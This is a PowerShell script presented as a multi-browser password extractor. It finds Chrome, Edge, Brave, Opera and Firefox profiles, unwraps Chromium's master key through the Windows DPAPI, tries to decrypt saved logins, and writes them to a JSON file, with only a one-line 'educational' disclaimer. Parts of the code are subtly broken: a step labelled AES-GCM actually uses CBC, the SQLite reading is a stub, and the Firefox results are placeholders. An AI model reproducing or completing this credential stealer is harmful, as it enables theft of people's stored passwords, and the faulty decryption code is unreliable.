# BrowserPasswordExtractor.ps1

# Import required modules
Add-Type -AssemblyName System.Security
Add-Type -AssemblyName System.Windows.Forms
Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;
    
    public class DPAPI {
        [DllImport("crypt32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool CryptUnprotectData(
            ref DATA_BLOB pDataIn,
            string szDataDescr,
            ref DATA_BLOB pOptionalEntropy,
            IntPtr pvReserved,
            ref CRYPTPROTECT_PROMPTSTRUCT pPromptStruct,
            int dwFlags,
            ref DATA_BLOB pDataOut);
            
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct DATA_BLOB {
            public int cbData;
            public IntPtr pbData;
        }
        
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct CRYPTPROTECT_PROMPTSTRUCT {
            public int cbSize;
            public int dwPromptFlags;
            public IntPtr hwndApp;
            public string szPrompt;
        }
    }
"@

# Browser Password Extractor Class
class BrowserPasswordExtractor {
    # Browser definitions
    [hashtable]$Browsers = @{
        "Chrome"  = "GetChromePaths"
        "Edge"    = "GetEdgePaths"
        "Brave"   = "GetBravePaths"
        "Opera"   = "GetOperaPaths"
        "Firefox" = "GetFirefoxPaths"
    }
    
    # Constructor
    BrowserPasswordExtractor() {
        # Check if running as administrator
        $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
        if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
            Write-Host "‚ö†Ô∏è  Run this script as Administrator for better results!" -ForegroundColor Yellow
        }
    }
    
    # Get Chrome profile paths
    [array]GetChromePaths() {
        $basePath = Join-Path $env:USERPROFILE "AppData\Local\Google\Chrome\User Data"
        return $this.GetChromiumProfiles($basePath)
    }
    
    # Get Edge profile paths
    [array]GetEdgePaths() {
        $basePath = Join-Path $env:USERPROFILE "AppData\Local\Microsoft\Edge\User Data"
        return $this.GetChromiumProfiles($basePath)
    }
    
    # Get Brave browser profile paths
    [array]GetBravePaths() {
        $basePath = Join-Path $env:USERPROFILE "AppData\Local\BraveSoftware\Brave-Browser\User Data"
        return $this.GetChromiumProfiles($basePath)
    }
    
    # Get Opera profile paths
    [array]GetOperaPaths() {
        $basePath = Join-Path $env:USERPROFILE "AppData\Roaming\Opera Software\Opera Stable"
        $profiles = @()
        
        if (Test-Path $basePath) {
            $loginData = Join-Path $basePath "Login Data"
            if (Test-Path $loginData) {
                $profiles += ,@("Default", $basePath)
            }
        }
        return $profiles
    }
    
    # Get Firefox profile paths
    [array]GetFirefoxPaths() {
        $firefoxPath = Join-Path $env:USERPROFILE "AppData\Roaming\Mozilla\Firefox\Profiles"
        $profiles = @()
        
        if (Test-Path $firefoxPath) {
            $profileDirs = Get-ChildItem -Path $firefoxPath -Directory -Filter "*.default*"
            foreach ($profileDir in $profileDirs) {
                $profiles += ,@($profileDir.Name, $profileDir.FullName)
            }
        }
        return $profiles
    }
    
    # Get profiles for Chromium-based browsers
    [array]GetChromiumProfiles([string]$basePath) {
        $profiles = @()
        
        if (Test-Path $basePath) {
            # Default profile
            $defaultProfile = Join-Path $basePath "Default"
            $defaultLoginData = Join-Path $defaultProfile "Login Data"
            if (Test-Path $defaultLoginData) {
                $profiles += ,@("Default", $defaultProfile)
            }
            
            # Other profiles
            $profileDirs = Get-ChildItem -Path $basePath -Directory -Filter "Profile *"
            foreach ($profileDir in $profileDirs) {
                $loginData = Join-Path $profileDir.FullName "Login Data"
                if (Test-Path $loginData) {
                    $profiles += ,@($profileDir.Name, $profileDir.FullName)
                }
            }
        }
        return $profiles
    }
    
    # Get encryption key for Chromium-based browsers
    [byte[]]GetEncryptionKey([string]$browserPath) {
        $localStatePath = Join-Path $browserPath "Local State"
        
        try {
            if (-not (Test-Path $localStatePath)) {
                Write-Host "    ‚ùå Local State file not found" -ForegroundColor Red
                return $null
            }
            
            $localStateJson = Get-Content $localStatePath -Raw | ConvertFrom-Json
            $encryptedKeyBase64 = $localStateJson.os_crypt.encrypted_key
            
            # Decode base64 and remove DPAPI prefix
            $encryptedKey = [System.Convert]::FromBase64String($encryptedKeyBase64)
            if ($encryptedKey.Length -le 5) {
                Write-Host "    ‚ùå Invalid encryption key" -ForegroundColor Red
                return $null
            }
            
            # Remove DPAPI prefix (first 5 bytes)
            $encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)]
            
            # Decrypt using DPAPI
            $decryptedKey = $this.DecryptWithDPAPI($encryptedKey)
            return $decryptedKey
            
        } catch {
            Write-Host "    ‚ùå Error getting encryption key: $_" -ForegroundColor Red
            return $null
        }
    }
    
    # Decrypt data using DPAPI
    [byte[]]DecryptWithDPAPI([byte[]]$encryptedData) {
        try {
            # Create DATA_BLOB structures
            $dataIn = New-Object DPAPI+DATA_BLOB
            $dataOut = New-Object DPAPI+DATA_BLOB
            $prompt = New-Object DPAPI+CRYPTPROTECT_PROMPTSTRUCT
            $entropy = New-Object DPAPI+DATA_BLOB
            
            # Prepare input data
            $dataIn.cbData = $encryptedData.Length
            $dataIn.pbData = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($dataIn.cbData)
            [System.Runtime.InteropServices.Marshal]::Copy($encryptedData, 0, $dataIn.pbData, $dataIn.cbData)
            
            # Set prompt structure
            $prompt.cbSize = [System.Runtime.InteropServices.Marshal]::SizeOf($prompt)
            $prompt.dwPromptFlags = 0
            $prompt.hwndApp = [IntPtr]::Zero
            $prompt.szPrompt = $null
            
            # Call DPAPI
            $success = [DPAPI]::CryptUnprotectData([ref]$dataIn, $null, [ref]$entropy, [IntPtr]::Zero, [ref]$prompt, 0, [ref]$dataOut)
            
            if ($success) {
                # Extract decrypted data
                $decryptedBytes = New-Object byte[] $dataOut.cbData
                [System.Runtime.InteropServices.Marshal]::Copy($dataOut.pbData, $decryptedBytes, 0, $dataOut.cbData)
                
                # Free memory
                [System.Runtime.InteropServices.Marshal]::FreeHGlobal($dataIn.pbData)
                [System.Runtime.InteropServices.Marshal]::FreeHGlobal($dataOut.pbData)
                
                return $decryptedBytes
            } else {
                Write-Host "    ‚ùå DPAPI decryption failed" -ForegroundColor Red
                return $null
            }
            
        } catch {
            Write-Host "    ‚ùå Error in DPAPI decryption: $_" -ForegroundColor Red
            return $null
        }
    }
    
    # Decrypt Chromium password
    [string]DecryptChromiumPassword([byte[]]$encryptedPassword, [byte[]]$key) {
        try {
            if ($null -eq $encryptedPassword -or $encryptedPassword.Length -eq 0) {
                return $null
            }
            
            # Check encryption type
            if ($encryptedPassword.Length -ge 3 -and 
                ($encryptedPassword[0] -eq 0x76 -and $encryptedPassword[1] -eq 0x31 -and $encryptedPassword[2] -eq 0x30) -or  # v10
                ($encryptedPassword[0] -eq 0x76 -and $encryptedPassword[1] -eq 0x32 -and $encryptedPassword[2] -eq 0x30)) {   # v20
                
                # AES-GCM encryption
                if ($encryptedPassword.Length -lt 15) {
                    return $null
                }
                
                # Extract components
                $iv = $encryptedPassword[3..14]
                $ciphertext = $encryptedPassword[15..($encryptedPassword.Length - 17)]
                $tag = $encryptedPassword[($encryptedPassword.Length - 16)..($encryptedPassword.Length - 1)]
                
                # Create AES-GCM decryptor
                $aes = [System.Security.Cryptography.Aes]::Create()
                $aes.Key = $key
                $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
                $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
                $aes.IV = $iv
                
                $decryptor = $aes.CreateDecryptor()
                $decrypted = $decryptor.TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
                
                return [System.Text.Encoding]::UTF8.GetString($decrypted)
                
            } else {
                # DPAPI encryption
                $decrypted = $this.DecryptWithDPAPI($encryptedPassword)
                if ($decrypted) {
                    return [System.Text.Encoding]::UTF8.GetString($decrypted)
                }
                return $null
            }
            
        } catch {
            return $null
        }
    }
    
    # Extract Firefox passwords (simplified)
    [array]DecryptFirefoxPassword([string]$profilePath) {
        $passwords = @()
        
        try {
            $signonsPath = Join-Path $profilePath "signons.sqlite"
            $loginsPath = Join-Path $profilePath "logins.json"
            
            # Try old format (signons.sqlite)
            if (Test-Path $signonsPath) {
                $tempDb = Join-Path $env:TEMP "temp_firefox.db"
                Copy-Item $signonsPath $tempDb -Force
                
                # Connect to SQLite using System.Data.SQLite if available
                # This is simplified - actual Firefox decryption requires key3.db/key4.db
                $passwords += @{
                    url = "Firefox Database"
                    username = "[Firefox - Requires Master Password]"
                    password = "[Firefox - Requires Master Password]"
                }
                
                Remove-Item $tempDb -ErrorAction SilentlyContinue
            }
            
            # Try new format (logins.json)
            elseif (Test-Path $loginsPath) {
                $loginsData = Get-Content $loginsPath -Raw | ConvertFrom-Json
                
                foreach ($login in $loginsData.logins) {
                    $passwords += @{
                        url = $login.hostname
                        username = "[Firefox - Encrypted]"
                        password = "[Firefox - Encrypted]"
                    }
                }
            }
            
        } catch {
            Write-Host "    ‚ùå Firefox decryption error: $_" -ForegroundColor Red
        }
        
        return $passwords
    }
    
    # Extract passwords from Chromium-based browsers
    [array]ExtractChromiumPasswords([string]$browserName, [string]$profileName, [string]$profilePath, [byte[]]$key) {
        $dbPath = Join-Path $profilePath "Login Data"
        
        if (-not (Test-Path $dbPath)) {
            return @()
        }
        
        $passwords = @()
        
        try {
            $tempDb = Join-Path $env:TEMP "temp_${browserName}_${profileName}.db"
            Copy-Item $dbPath $tempDb -Force
            
            # Use SQLite .NET provider or ADO.NET
            # This requires System.Data.SQLite assembly
            # For simplicity, we'll use a simplified approach
            # Note: Full implementation requires SQLite library
            
            # Check if we can read the database
            if (Test-Path $tempDb) {
                Write-Host "      ‚ö†Ô∏è  SQLite extraction requires additional setup" -ForegroundColor Yellow
                Write-Host "      üí° Install: Install-Package System.Data.SQLite" -ForegroundColor Cyan
            }
            
            Remove-Item $tempDb -ErrorAction SilentlyContinue
            
        } catch {
            Write-Host "    ‚ùå Error extracting from $browserName : $_" -ForegroundColor Red
        }
        
        return $passwords
    }
    
    # Scan all browsers
    [hashtable]ScanAllBrowsers() {
        Write-Host "`nüåê Multi-Browser Password Extractor" -ForegroundColor Cyan
        Write-Host "=" * 60 -ForegroundColor Cyan
        Write-Host "Scanning all major browsers..." -ForegroundColor White
        Write-Host ""
        
        $allResults = @{}
        
        foreach ($browserName in $this.Browsers.Keys) {
            Write-Host "üîç Scanning $browserName..." -ForegroundColor Yellow
            
            try {
                $profileMethod = $this.Browsers[$browserName]
                $profiles = $this.$profileMethod()
                
                if ($profiles.Count -eq 0) {
                    Write-Host "   ‚ùå $browserName not found or no profiles" -ForegroundColor Red
                    continue
                }
                
                Write-Host "   ‚úì Found $($profiles.Count) profile(s)" -ForegroundColor Green
                
                $browserPasswords = @()
                
                foreach ($profile in $profiles) {
                    $profileName = $profile[0]
                    $profilePath = $profile[1]
                    
                    if ($browserName -eq "Firefox") {
                        $passwords = $this.DecryptFirefoxPassword($profilePath)
                    } else {
                        $browserDir = Split-Path $profilePath -Parent
                        $key = $this.GetEncryptionKey($browserDir)
                        
                        if ($key) {
                            $passwords = $this.ExtractChromiumPasswords($browserName, $profileName, $profilePath, $key)
                        } else {
                            $passwords = @()
                        }
                    }
                    
                    $browserPasswords += $passwords
                    Write-Host "      üìÅ $profileName : $($passwords.Count) passwords" -ForegroundColor Gray
                }
                
                $allResults[$browserName] = $browserPasswords
                Write-Host "   ‚úÖ $browserName : $($browserPasswords.Count) total passwords" -ForegroundColor Green
                
            } catch {
                Write-Host "   ‚ùå Error scanning $browserName : $_" -ForegroundColor Red
            }
            
            Write-Host ""
        }
        
        return $allResults
    }
    
    # Display results
    [void]DisplayResults([hashtable]$results) {
        Write-Host "`nüìã EXTRACTION RESULTS" -ForegroundColor Cyan
        Write-Host "=" * 80 -ForegroundColor Cyan
        Write-Host ""
        
        $totalPasswords = 0
        
        foreach ($browserName in $results.Keys) {
            $passwords = $results[$browserName]
            
            if ($passwords.Count -gt 0) {
                Write-Host "üñ•Ô∏è  $($browserName.ToUpper()) ($($passwords.Count) passwords):" -ForegroundColor Yellow
                Write-Host "-" * 60 -ForegroundColor Gray
                
                $count = 1
                foreach ($entry in $passwords) {
                    if ($count -le 10) {  # Show first 10
                        Write-Host "  $($count.ToString().PadLeft(2)). üåê $($entry.url)" -ForegroundColor White
                        Write-Host "      üë§ $($entry.username)" -ForegroundColor Gray
                        Write-Host "      üîë $($entry.password)" -ForegroundColor Gray
                        $count++
                    }
                }
                
                if ($passwords.Count -gt 10) {
                    Write-Host "  ... and $($passwords.Count - 10) more passwords" -ForegroundColor DarkGray
                }
                
                Write-Host ""
                $totalPasswords += $passwords.Count
            }
        }
        
        $browsersWithPasswords = ($results.Keys | Where-Object { $results[$_].Count -gt 0 }).Count
        Write-Host "`nüìä SUMMARY: Found $totalPasswords total passwords across $browsersWithPasswords browsers" -ForegroundColor Green
        
        # Save to file
        $this.SaveToFile($results)
    }
    
    # Save results to file
    [void]SaveToFile([hashtable]$results) {
        $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
        $filename = "browser_passwords_${timestamp}.json"
        
        # Convert to serializable format
        $serializableResults = @{}
        foreach ($browser in $results.Keys) {
            $serializableResults[$browser] = $results[$browser]
        }
        
        $serializableResults | ConvertTo-Json -Depth 10 | Out-File -FilePath $filename -Encoding UTF8
        Write-Host "`nüíæ Results saved to: $filename" -ForegroundColor Green
    }
}

# Main execution function
function Main {
    Clear-Host
    
    # Banner
    Write-Host "===============================================================" -ForegroundColor Cyan
    Write-Host "          MULTI-BROWSER PASSWORD EXTRACTOR" -ForegroundColor Yellow
    Write-Host "===============================================================" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "üöÄ Starting Multi-Browser Password Extraction..." -ForegroundColor Green
    Write-Host "‚ö†Ô∏è  IMPORTANT NOTES:" -ForegroundColor Yellow
    Write-Host "   ‚Ä¢ Make sure all browsers are CLOSED before running!" -ForegroundColor Yellow
    Write-Host "   ‚Ä¢ Run as Administrator for best results" -ForegroundColor Yellow
    Write-Host "   ‚Ä¢ This tool is for educational/authorized use only" -ForegroundColor Red
    Write-Host ""
    
    # Confirmation
    $confirmation = Read-Host "Press Enter to continue (or type 'exit' to cancel)"
    if ($confirmation -eq "exit") {
        Write-Host "Operation cancelled by user." -ForegroundColor Yellow
        return
    }
    
    # Create extractor and scan
    $extractor = [BrowserPasswordExtractor]::new()
    $results = $extractor.ScanAllBrowsers()
    
    # Display results
    if ($results.Count -gt 0) {
        $extractor.DisplayResults($results)
    } else {
        Write-Host "`n‚ùå No passwords found or no browsers detected." -ForegroundColor Red
    }
    
    Write-Host "`n‚úÖ Extraction complete!" -ForegroundColor Green
    Write-Host "Press any key to exit..."
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

# Entry point
if ($MyInvocation.MyCommand.CommandType -eq "Script") {
    Main
}
